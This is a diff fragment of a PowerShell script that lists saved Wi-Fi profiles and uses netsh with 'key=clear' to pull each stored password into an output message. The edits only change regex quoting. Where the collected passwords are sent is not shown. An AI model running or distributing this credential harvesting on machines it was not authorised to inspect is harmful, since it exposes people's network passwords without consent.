@@ -9,7 +9,7 @@ $wifiProfiles = netsh wlan show profiles | Out-String
 # Process each line to capture profile names
 $wifiProfiles -split '\r?\n' | ForEach-Object {
     # Check if the line contains a Wi-Fi profile name
-    if ($_ -match ":\s*(.+)") {
+    if ($_ -match ':\s*(.+)') {
         $profileName = $matches[1]
         $passwordInfo = netsh wlan show profile name="$profileName" key=clear
 
@@ -20,7 +20,7 @@ Password Info: $passwordInfo
 "@
 
         # Check if password information is found
-        if ($passwordInfo -match "Key Content\s*:\s*(.+)") {
+        if ($passwordInfo -match 'Key Content\s*:\s*(.+)') {
             $password = $matches[1].Trim()
             $outputMessage += "Password: $password`n"
         } else {
@@ -34,6 +34,7 @@ Password Info: $passwordInfo
         }
     }
 }
+
 
 
 
